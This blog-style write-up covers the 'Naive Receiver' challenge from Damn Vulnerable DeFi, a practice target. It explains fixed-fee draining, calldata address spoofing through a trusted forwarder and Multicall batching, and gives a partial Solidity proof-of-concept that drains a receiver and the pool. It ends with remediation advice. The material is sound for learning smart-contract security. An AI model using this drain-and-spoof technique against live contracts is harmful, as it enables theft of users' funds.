---
title: 'Damn Vulnerable DeFi - Naive Receiver'
description: 'Exploiting fixed fees and identity spoofing. Learn how to drain a user’s balance through forced flash loans and hijack admin privileges via meta-transactions.'
date: 2025-07-05
tags: ['solidity', 'security', 'flash-loan', 'meta-transactions', 'multicall', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🤖 Naive Receiver - Fee Exploitation & Identity Spoofing

## Challenge Overview

The setup involves several components:
1.  **NaiveReceiverPool**: A pool with 1000 WETH providing flash loans.
2.  **FlashLoanReceiver**: A contract with 10 WETH, designed to receive flash loans and pay fees.
3.  **BasicForwarder**: A trusted forwarder for EIP712 meta-transactions.

**The Mission:**
1. Drain all 10 WETH from the `FlashLoanReceiver`.
2. Drain all 1000 WETH from the pool.
3. Transfer everything to the recovery address in **2 or fewer transactions**.

---

## Technical Analysis

### Vulnerability 1: Fixed Flash Loan Fees

The pool charges a fixed fee regardless of the loan amount:

```solidity
function flashFee(address token, uint256) external view returns (uint256) {
    if (token != address(weth)) revert UnsupportedCurrency();
    return FIXED_FEE; // 1 WETH
}
```

Since anyone can trigger a flash loan for **any** receiver, an attacker can force the `FlashLoanReceiver` to take 10 loans of 0 ETH, each costing 1 WETH in fees, effectively draining its 10 WETH balance into the pool.

### Vulnerability 2: Identity Spoofing via Trusted Forwarder

The pool uses a custom `_msgSender()` to support meta-transactions:

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

If a call comes from the `trustedForwarder`, the contract trusts the last 20 bytes of the `calldata` as the caller's address. By crafting a specific calldata through the forwarder, an attacker can spoof the `deployer`'s address and call the admin-only `withdraw` function.

### Vulnerability 3: Multicall Aggregation

The pool inherits `Multicall`, allowing multiple function calls to be batched into a single transaction. This is key to staying within the 2-transaction limit.

---

## The Exploit: The Multi-Step Heist

1.  **Batch the Attacks:** Create a `multicall` payload that contains:
    *   10 calls to `flashLoan` targeting the receiver (drains 10 WETH to the pool).
    *   1 call to `withdraw` with the spoofed admin address appended to the calldata (drains the pool's 1010 WETH).
2.  **Meta-Transaction:** Wrap this `multicall` in an EIP712 request for the `BasicForwarder`.
3.  **Signature & Execution:** Sign the request and execute it via the forwarder.

---

## Proof of Concept (PoC)

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory calls = new bytes[](11);
    
    // 1. Drain the receiver's 10 WETH via 10 fee-bearing loans
    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
    }
    
    // 2. Spoof admin and withdraw all 1010 WETH
    calls[10] = abi.encodePacked(
        abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer))) // Appended spoofed address
    );
    
    // 3. Package into Multicall and send via Forwarder
    bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));
    
    // (Standard EIP712 signing and forwarder.execute logic follows...)
}
```

---

## Auditor's Lessons

1.  **Fee Scaling:** Fees should almost always be proportional to the loan amount or have a minimum loan requirement to prevent "drain-by-fee" attacks.
2.  **Receiver Authorization:** Consider requiring the receiver to "opt-in" or sign for a flash loan before it is executed on their behalf.
3.  **Secure Context Identification:** Be extremely careful with custom `_msgSender()` implementations. Appending addresses to calldata is a powerful but dangerous pattern if not strictly validated.
4.  **Batching Risks:** Multicall can amplify the impact of existing vulnerabilities by allowing them to be chained in ways the developer didn't foresee.

---

## Remediation

*   **Proportional Fees:** Change `flashFee` to return a percentage of the requested amount.
*   **Access Control on Flash Loans:** Only allow the receiver itself or an authorized party to trigger a loan for a specific address.
*   **Hardcoded Permissions:** Instead of relying on `_msgSender()` for critical functions like `withdraw`, use a hardcoded `immutable` owner address set during deployment.
